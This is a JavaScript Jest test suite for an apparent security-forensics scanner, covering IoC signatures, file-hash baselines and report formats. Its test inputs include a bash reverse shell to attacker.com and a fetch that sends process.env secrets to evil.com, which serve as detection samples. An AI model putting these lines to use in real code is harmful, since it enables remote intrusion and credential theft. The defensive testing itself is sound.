/**
 * Layer 8 Security Forensics Tests
 * Comprehensive test suite for IoC detection, baseline system, and reporters
 */

const path = require('path');
const fs = require('fs').promises;
const { execSync } = require('child_process');

const fixturesPath = path.join(__dirname, 'fixtures', 'layer-8');

describe('Layer 8 Security Forensics', () => {
  let Layer8;
  let SignatureAnalyzer;
  let IOC_SIGNATURES;
  let CLIReporter;
  let JSONReporter;
  
  beforeAll(() => {
    Layer8 = require('../scripts/fix-layer-8-security');
    SignatureAnalyzer = require('../scripts/fix-layer-8-security/detectors/signature-analyzer');
    IOC_SIGNATURES = require('../scripts/fix-layer-8-security/constants').IOC_SIGNATURES;
    CLIReporter = require('../scripts/fix-layer-8-security/reporters/cli-reporter');
    JSONReporter = require('../scripts/fix-layer-8-security/reporters/json-reporter');
  });

  describe('IoC Signature Constants', () => {
    test('should have 25 IoC signatures defined', () => {
      expect(Object.keys(IOC_SIGNATURES).length).toBe(25);
    });

    test('should have required fields for each signature', () => {
      Object.entries(IOC_SIGNATURES).forEach(([id, sig]) => {
        expect(sig.id).toBeDefined();
        expect(sig.name).toBeDefined();
        expect(sig.pattern).toBeDefined();
        expect(sig.severity).toMatch(/^(critical|high|medium|low)$/);
        expect(sig.category).toBeDefined();
        expect(sig.description).toBeDefined();
        expect(sig.remediation).toBeDefined();
      });
    });

    test('should have critical severity for eval patterns', () => {
      expect(IOC_SIGNATURES.EVAL_USAGE.severity).toBe('critical');
    });

    test('should have critical severity for Function constructor', () => {
      expect(IOC_SIGNATURES.FUNCTION_CONSTRUCTOR.severity).toBe('critical');
    });

    test('should have high severity for child process usage', () => {
      expect(IOC_SIGNATURES.CHILD_PROCESS_SPAWN.severity).toBe('high');
    });

    test('should include RSC-specific patterns', () => {
      expect(IOC_SIGNATURES.RSC_UNSAFE_EVAL).toBeDefined();
      expect(IOC_SIGNATURES.RSC_UNVALIDATED_REDIRECT).toBeDefined();
      expect(IOC_SIGNATURES.RSC_UNSAFE_EVAL.category).toBe('rsc-security');
    });

    test('should include exfiltration patterns', () => {
      expect(IOC_SIGNATURES.PROCESS_ENV_EXFIL).toBeDefined();
      expect(IOC_SIGNATURES.DATA_EXFIL_FETCH).toBeDefined();
    });

    test('should include persistence patterns', () => {
      expect(IOC_SIGNATURES.WEBSOCKET_C2).toBeDefined();
      expect(IOC_SIGNATURES.CRON_PERSISTENCE).toBeDefined();
    });
  });

  describe('Signature Analyzer', () => {
    let analyzer;
    
    beforeEach(() => {
      analyzer = new SignatureAnalyzer({ verbose: false });
    });

    test('should detect eval() usage', async () => {
      const code = 'const result = eval(userInput);';
      const findings = await analyzer.analyzeCode(code, 'test.js');
      
      expect(findings.length).toBeGreaterThan(0);
      const evalFinding = findings.find(f => f.id === 'NEUROLINT-IOC-001');
      expect(evalFinding).toBeDefined();
      expect(evalFinding.severity).toBe('critical');
    });

    test('should detect Function constructor', async () => {
      const code = 'const fn = new Function("return " + code);';
      const findings = await analyzer.analyzeCode(code, 'test.js');
      
      const fnFinding = findings.find(f => f.id === 'NEUROLINT-IOC-002');
      expect(fnFinding).toBeDefined();
      expect(fnFinding.severity).toBe('critical');
    });

    test('should detect child_process require', async () => {
      const code = "const { exec } = require('child_process');";
      const findings = await analyzer.analyzeCode(code, 'test.js');
      
      const cpFinding = findings.find(f => f.id === 'NEUROLINT-IOC-005');
      expect(cpFinding).toBeDefined();
    });

    test('should detect base64 encoded strings', async () => {
      const code = "const decoded = Buffer.from(encoded, 'base64');";
      const findings = await analyzer.analyzeCode(code, 'test.js');
      
      const b64Finding = findings.find(f => f.id === 'NEUROLINT-IOC-006');
      expect(b64Finding).toBeDefined();
    });

    test('should detect shell patterns', async () => {
      const code = "const cmd = '/bin/bash -i >& /dev/tcp/attacker.com/4444';";
      const findings = await analyzer.analyzeCode(code, 'test.js');
      
      const shellFinding = findings.find(f => f.id === 'NEUROLINT-IOC-010');
      expect(shellFinding).toBeDefined();
      expect(shellFinding.severity).toBe('critical');
    });

    test('should detect process.env exfiltration patterns', async () => {
      const code = `
        const secrets = { key: process.env.API_KEY };
        fetch('https://evil.com', { body: JSON.stringify(secrets) });
      `;
      const findings = await analyzer.analyzeCode(code, 'test.js');
      
      const exfilFinding = findings.find(f => f.id === 'NEUROLINT-IOC-012');
      expect(exfilFinding).toBeDefined();
    });

    test('should detect dynamic import with variable', async () => {
      const code = "const mod = await import(moduleName);";
      const findings = await analyzer.analyzeCode(code, 'test.js');
      
      const dynImportFinding = findings.find(f => f.id === 'NEUROLINT-IOC-017');
      expect(dynImportFinding).toBeDefined();
    });

    test('should detect dangerouslySetInnerHTML', async () => {
      const code = '<div dangerouslySetInnerHTML={{ __html: userInput }} />';
      const findings = await analyzer.analyzeCode(code, 'test.jsx');
      
      const dangerousFinding = findings.find(f => f.id === 'NEUROLINT-IOC-019');
      expect(dangerousFinding).toBeDefined();
    });

    test('should NOT flag clean code', async () => {
      const cleanCode = await fs.readFile(
        path.join(fixturesPath, 'clean-code.js'),
        'utf8'
      );
      const findings = await analyzer.analyzeCode(cleanCode, 'clean-code.js');
      
      const criticalFindings = findings.filter(f => f.severity === 'critical');
      expect(criticalFindings.length).toBe(0);
    });

    test('should detect multiple vulnerabilities in vulnerable code', async () => {
      const vulnCode = await fs.readFile(
        path.join(fixturesPath, 'vulnerable-code.js'),
        'utf8'
      );
      const findings = await analyzer.analyzeCode(vulnCode, 'vulnerable-code.js');
      
      expect(findings.length).toBeGreaterThan(3);
      
      const hasEval = findings.some(f => f.id === 'NEUROLINT-IOC-001');
      const hasFunction = findings.some(f => f.id === 'NEUROLINT-IOC-002');
      const hasChildProcess = findings.some(f => f.id === 'NEUROLINT-IOC-005');
      
      expect(hasEval).toBe(true);
      expect(hasFunction).toBe(true);
      expect(hasChildProcess).toBe(true);
    });

    test('should provide correct line numbers', async () => {
      const code = `line1
line2
const result = eval(userInput);
line4`;
      const findings = await analyzer.analyzeCode(code, 'test.js');
      
      const evalFinding = findings.find(f => f.id === 'NEUROLINT-IOC-001');
      expect(evalFinding).toBeDefined();
      expect(evalFinding.line).toBe(3);
    });

    test('should apply false positive filtering', async () => {
      const code = `
        // This is just a comment mentioning eval for documentation
        const docs = "Use eval() carefully - see MDN docs";
      `;
      const findings = await analyzer.analyzeCode(code, 'test.js');
      
      const evalFindings = findings.filter(f => f.id === 'NEUROLINT-IOC-001');
      expect(evalFindings.every(f => f.confidence < 100)).toBe(true);
    });
  });

  describe('Layer 8 Interface', () => {
    test('should expose analyze method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.analyze).toBe('function');
    });

    test('should expose transform method (read-only by default)', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.transform).toBe('function');
    });

    test('should expose scanCompromise method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.scanCompromise).toBe('function');
    });

    test('should expose createBaseline method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.createBaseline).toBe('function');
    });

    test('should expose compareBaseline method', () => {
      const layer8 = new Layer8();
      expect(typeof layer8.compareBaseline).toBe('function');
    });

    test('should have isReadOnly flag set to true by default', () => {
      const layer8 = new Layer8();
      expect(layer8.isReadOnly).toBe(true);
    });

    test('should scan fixtures directory and find vulnerabilities', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      const result = await layer8.scanCompromise(fixturesPath);
      
      expect(result.findings).toBeDefined();
      expect(result.findings.length).toBeGreaterThan(0);
      expect(result.summary).toBeDefined();
      expect(result.summary.total).toBeGreaterThan(0);
    });

    test('should respect mode settings', async () => {
      const quickLayer = new Layer8({ mode: 'quick' });
      const standardLayer = new Layer8({ mode: 'standard' });
      
      const quickResult = await quickLayer.scanCompromise(fixturesPath);
      const standardResult = await standardLayer.scanCompromise(fixturesPath);
      
      expect(quickResult.mode).toBe('quick');
      expect(standardResult.mode).toBe('standard');
    });
  });

  describe('Baseline System', () => {
    const testBaselinePath = path.join(__dirname, '.test-baseline.json');
    
    afterEach(async () => {
      try {
        await fs.unlink(testBaselinePath);
      } catch (e) {
      }
    });

    test('should create baseline with file hashes', async () => {
      const layer8 = new Layer8();
      const result = await layer8.createBaseline(fixturesPath, {
        output: testBaselinePath
      });
      
      expect(result.success).toBe(true);
      expect(result.fileCount).toBeGreaterThan(0);
      expect(result.baselinePath).toBe(testBaselinePath);
      
      const baseline = JSON.parse(await fs.readFile(testBaselinePath, 'utf8'));
      expect(baseline.version).toBeDefined();
      expect(baseline.created).toBeDefined();
      expect(baseline.files).toBeDefined();
      expect(Object.keys(baseline.files).length).toBeGreaterThan(0);
    });

    test('should detect unchanged files in comparison', async () => {
      const layer8 = new Layer8();
      
      await layer8.createBaseline(fixturesPath, { output: testBaselinePath });
      
      const comparison = await layer8.compareBaseline(fixturesPath, testBaselinePath);
      
      expect(comparison.comparison.hasChanges).toBe(false);
      expect(comparison.summary.unchanged).toBeGreaterThan(0);
      expect(comparison.summary.modified).toBe(0);
    });

    test('should include file hashes in baseline', async () => {
      const layer8 = new Layer8();
      await layer8.createBaseline(fixturesPath, { output: testBaselinePath });
      
      const baseline = JSON.parse(await fs.readFile(testBaselinePath, 'utf8'));
      
      const firstFile = Object.values(baseline.files)[0];
      expect(firstFile.hash).toBeDefined();
      expect(firstFile.hash.length).toBe(64);
      expect(firstFile.size).toBeDefined();
    });
  });

  describe('CLI Reporter', () => {
    test('should format findings correctly', () => {
      const reporter = new CLIReporter();
      const findings = [
        {
          id: 'NEUROLINT-IOC-001',
          name: 'Eval Usage',
          severity: 'critical',
          file: 'test.js',
          line: 10,
          column: 5,
          match: 'eval(userInput)',
          description: 'Dangerous eval usage',
          remediation: 'Remove eval',
          confidence: 95
        }
      ];
      
      const output = reporter.formatFindings(findings);
      
      expect(output).toContain('NEUROLINT-IOC-001');
      expect(output).toContain('Eval Usage');
      expect(output).toContain('test.js');
    });

    test('should generate summary section', () => {
      const reporter = new CLIReporter();
      const summary = {
        total: 5,
        critical: 2,
        high: 2,
        medium: 1,
        low: 0
      };
      
      const output = reporter.formatSummary(summary, { filesScanned: 100 });
      
      expect(output).toContain('5');
      expect(output).toContain('Critical');
    });

    test('should color-code by severity', () => {
      const reporter = new CLIReporter();
      
      const criticalColor = reporter.getSeverityColor('critical');
      const highColor = reporter.getSeverityColor('high');
      const mediumColor = reporter.getSeverityColor('medium');
      const lowColor = reporter.getSeverityColor('low');
      
      expect(criticalColor).toContain('\x1b[');
      expect(highColor).toContain('\x1b[');
      expect(mediumColor).toContain('\x1b[');
      expect(lowColor).toContain('\x1b[');
    });
  });

  describe('JSON Reporter', () => {
    test('should generate valid JSON output', () => {
      const reporter = new JSONReporter();
      const scanResult = {
        findings: [
          {
            id: 'NEUROLINT-IOC-001',
            name: 'Eval Usage',
            severity: 'critical',
            file: 'test.js',
            line: 10
          }
        ],
        summary: { total: 1, critical: 1, high: 0, medium: 0, low: 0 }
      };
      
      const output = reporter.generate(scanResult, { targetPath: '/test' });
      const parsed = JSON.parse(output);
      
      expect(parsed.findings).toBeDefined();
      expect(parsed.findings.length).toBe(1);
      expect(parsed.summary).toBeDefined();
    });

    test('should include metadata in JSON output', () => {
      const reporter = new JSONReporter();
      const scanResult = {
        findings: [],
        summary: { total: 0, critical: 0, high: 0, medium: 0, low: 0 }
      };
      
      const output = reporter.generate(scanResult, { 
        targetPath: '/test',
        mode: 'standard'
      });
      const parsed = JSON.parse(output);
      
      expect(parsed.metadata).toBeDefined();
      expect(parsed.metadata.scanDate).toBeDefined();
      expect(parsed.metadata.mode).toBe('standard');
    });

    test('should be machine-parseable', () => {
      const reporter = new JSONReporter();
      const scanResult = {
        findings: [
          { id: 'TEST-001', severity: 'high', file: 'a.js' },
          { id: 'TEST-002', severity: 'critical', file: 'b.js' }
        ],
        summary: { total: 2, critical: 1, high: 1, medium: 0, low: 0 }
      };
      
      const output = reporter.generate(scanResult, {});
      
      expect(() => JSON.parse(output)).not.toThrow();
      
      const parsed = JSON.parse(output);
      const criticalFindings = parsed.findings.filter(f => f.severity === 'critical');
      expect(criticalFindings.length).toBe(1);
    });
  });

  describe('CLI Integration', () => {
    test('should run security:scan-compromise command', () => {
      const output = execSync(
        `node cli.js security:scan-compromise ${fixturesPath} --quick 2>&1`,
        { encoding: 'utf8', timeout: 30000 }
      );
      
      expect(output).toContain('Security Forensics');
      expect(output).toContain('SCAN SUMMARY');
    });

    test('should support --json output flag', () => {
      const output = execSync(
        `node cli.js security:scan-compromise ${fixturesPath} --quick --json 2>&1`,
        { encoding: 'utf8', timeout: 30000 }
      );
      
      const jsonStart = output.indexOf('{');
      const jsonEnd = output.lastIndexOf('}');
      if (jsonStart >= 0 && jsonEnd >= 0) {
        const jsonStr = output.substring(jsonStart, jsonEnd + 1);
        expect(() => JSON.parse(jsonStr)).not.toThrow();
      }
    });

    test('should show help for security commands', () => {
      const output = execSync('node cli.js help 2>&1', { encoding: 'utf8' });
      
      expect(output).toContain('security:scan-compromise');
      expect(output).toContain('security:create-baseline');
      expect(output).toContain('security:compare-baseline');
    });

    test('should accept --verbose flag', () => {
      const output = execSync(
        `node cli.js security:scan-compromise ${fixturesPath} --quick --verbose 2>&1`,
        { encoding: 'utf8', timeout: 30000 }
      );
      
      expect(output).toContain('Security Forensics');
    });
  });

  describe('False Positive Handling', () => {
    test('should reduce confidence for patterns in comments', async () => {
      const analyzer = new SignatureAnalyzer();
      const code = `
        // Don't use eval() - it's dangerous
        /* eval is mentioned here for documentation */
        const safe = "This is safe code";
      `;
      
      const findings = await analyzer.analyzeCode(code, 'test.js');
      
      findings.forEach(f => {
        if (f.id === 'NEUROLINT-IOC-001') {
          expect(f.confidence).toBeLessThan(80);
        }
      });
    });

    test('should reduce confidence for patterns in strings', async () => {
      const analyzer = new SignatureAnalyzer();
      const code = `
        const errorMessage = "Error: eval() is not allowed";
        const docs = "The eval function is deprecated";
      `;
      
      const findings = await analyzer.analyzeCode(code, 'test.js');
      
      findings.forEach(f => {
        if (f.id === 'NEUROLINT-IOC-001') {
          expect(f.confidence).toBeLessThan(80);
        }
      });
    });

    test('should have higher confidence for actual code patterns', async () => {
      const analyzer = new SignatureAnalyzer();
      const code = `
        function dangerous(input) {
          return eval(input);
        }
      `;
      
      const findings = await analyzer.analyzeCode(code, 'test.js');
      const evalFinding = findings.find(f => f.id === 'NEUROLINT-IOC-001');
      
      expect(evalFinding).toBeDefined();
      expect(evalFinding.confidence).toBeGreaterThanOrEqual(80);
    });
  });

  describe('Scan Modes', () => {
    test('quick mode should be faster', async () => {
      const layer8 = new Layer8({ mode: 'quick' });
      
      const start = Date.now();
      await layer8.scanCompromise(fixturesPath);
      const quickTime = Date.now() - start;
      
      expect(quickTime).toBeLessThan(5000);
    });

    test('paranoid mode should check more patterns', async () => {
      const standardLayer = new Layer8({ mode: 'standard' });
      const paranoidLayer = new Layer8({ mode: 'paranoid' });
      
      const standardResult = await standardLayer.scanCompromise(fixturesPath);
      const paranoidResult = await paranoidLayer.scanCompromise(fixturesPath);
      
      expect(paranoidResult.findings.length).toBeGreaterThanOrEqual(
        standardResult.findings.length
      );
    });
  });
});
